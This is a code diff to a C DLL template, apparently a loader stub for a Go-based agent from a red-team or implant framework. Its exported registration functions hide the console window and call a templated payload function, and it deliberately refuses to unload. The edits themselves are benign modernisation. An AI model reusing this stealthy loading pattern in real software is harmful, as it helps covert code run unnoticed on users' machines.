@@ -14,8 +14,8 @@
 // along with this program.  If not, see <https://www.gnu.org/licenses/>.
 //
 
-#define WINVER 0x0501
-#define _WIN32_WINNT 0x0501
+#define WINVER 0x0600
+#define _WIN32_WINNT 0x0600
 
 #define NOWH
 #define NOMB
@@ -51,6 +51,8 @@
 #define NODEFERWINDOWPOS
 #define NOVIRTUALKEYCODES
 #define WIN32_LEAN_AND_MEAN
+
+#define UNICODE
 #define EXPORT __declspec(dllexport)
 
 #include <winsock.h>
@@ -59,25 +61,25 @@
 
 #include "bolt.h"
 
-EXPORT HRESULT WINAPI VoidFunc() {
+EXPORT HRESULT WINAPI VoidFunc(void) {
     HANDLE c = GetConsoleWindow();
     if (c != NULL) {
         ShowWindow(c, 0);
     }
     $secondary();
 }
-EXPORT HRESULT WINAPI DllCanUnloadNow() {
+EXPORT HRESULT WINAPI DllCanUnloadNow(void) {
     // Always return S_FALSE so we can stay loaded.
     return 1;
 }
-EXPORT HRESULT WINAPI DllRegisterServer() {
+EXPORT HRESULT WINAPI DllRegisterServer(void) {
     HANDLE c = GetConsoleWindow();
     if (c != NULL) {
         ShowWindow(c, 0);
     }
     $secondary();
 }
-EXPORT HRESULT WINAPI DllUnregisterServer() {
+EXPORT HRESULT WINAPI DllUnregisterServer(void) {
     HANDLE c = GetConsoleWindow();
     if (c != NULL) {
         ShowWindow(c, 0);
@@ -118,5 +120,11 @@ EXPORT VOID WINAPI $funcname(HWND h, HINSTANCE i, LPSTR a, int s) {
 }
 
 EXPORT BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID args) {
+    if (r == DLL_PROCESS_ATTACH) {
+        DisableThreadLibraryCalls(h);
+    }
+    if (r == DLL_PROCESS_DETACH) {
+        GenerateConsoleCtrlEvent(1, 0); // Generate a SIGTERM signal to tell Go to exit cleanly.
+    }
     return TRUE;
 }
